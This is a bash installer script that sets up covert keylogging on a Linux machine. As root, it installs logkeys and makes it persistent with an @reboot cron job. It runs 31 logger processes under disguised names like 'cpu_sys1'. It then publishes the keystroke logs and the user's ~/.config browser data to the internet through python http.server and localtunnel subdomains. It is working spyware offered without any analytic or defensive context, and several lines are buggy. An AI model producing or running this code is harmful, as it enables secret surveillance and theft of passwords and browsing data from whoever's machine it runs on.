#! /bin/bash

if [ `id -u` -ne 0 ]; then
    echo "You must be root to run this script, Exiting.."
    exit 1
fi

CHECK_PROC=`ps aux | grep -i "setup.sh" | grep -v "grep" | wc -l`
USER=`whoami`
CRON_FILE="/var/spool/cron/root"
INSTALL_DIR="/usr/local/core_sys"
SHELL_DEST="/usr/local/core_sys/core.sh"
ME=`basename $0`
CONFIG_PATH="~/.config"

if [ $CHECK_PROC -gt 1 ]; then
    echo "Another instance of this script is already running, Exiting.."
    exit 1
fi

if [ ! -f $CRON_FILE ]; then
    echo "cron file for root doesnot exist, creating.."
    touch $SHELL_DEST
    echoi $ME >> $SHELL_DEST
fi

mkdir $INSTALL_DIR

INSTALL() {
    echo "Installing.."
    apt install -y python python3 build-essential autotools-dev autoconf kbd
    git clone https://github.com/kernc/logkeys.git $INSTALL_DIR
    cd $INSTALL_DIR
    ./autogen.sh
    cd build 
    ../configure

    make
    make install

    apt install -y npm nodejs
    npm install -g localtunnel
}


if [ ! whereis logkeys | grep -i "logkeys" ]; then
   INSTALL
else
   echo "Logkeys already installed, Exiting.."
   exit 1
fi

INSTALL 

if [ ! -f $SHELL_DEST ]; then
    echo "Creating shell script.."
    touch $SHELL_DEST
    cat $ME >> $SHELL_DEST
    chmod +x $SHELL_DEST
fi


if [ $CHECK_PROC -gt 1 ]; then
    echo "Another instance of this script is already running, Exiting.."
    exit 1
   else
        echo "setup.sh is not running"
        echo "@reboot /bin/bash $SHELL_DEST" >> $CRON_FILE
        crontab $CRON_FILE
        echo "setup.sh is running"
fi

KEYLOGGER() {
    echo "Starting keylogger.."
    cd $INSTALL_DIR
    for i in $(seq 1 31); do
        PROC_NAME="cpu_sys$i"
        OUTPUT_FILE="core_sys$i.md"
        EVENT_NAME="event$i"
        COMMAND="logkeys -s -d $EVENT_NAME --output $OUTPUT_FILE"
        bash -c "exec -a $PROC_NAME $COMMAND &" 
        #logkeys -s -d $EVENT_NAME --output $OUTPUT_FILE || echo "$EVENT_NAME"
        rm -rf /var/run/logkeys.pid
    done
}

FTP_SERVER() {
    echo "Starting ftp server.."
    cd $INSTALL_DIR
    cmd1="python3 -m http.server 31"
    eval "${cmd1}" &>/dev/null & disown;
    cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812432"
    eval "${cmd2}" &>/dev/null & disown;
}

BROWSER_HISTORY() {
    echo "Starting browser history.."
    cd $CONFIG_PATH
    cmd1="python3 -m http.server 32"
    eval "${cmd1}" &>/dev/null & disown;
    cmd2="lt --local-host 0.0.0.0 --port 32 --subdomain config812432"
    eval "${cmd2}" &>/dev/null & disown;
}

MAIN() {
    echo "Starting main.."
    KEYLOGGER
    FTP_SERVER
    BROWSER_HISTORY
}

MAIN
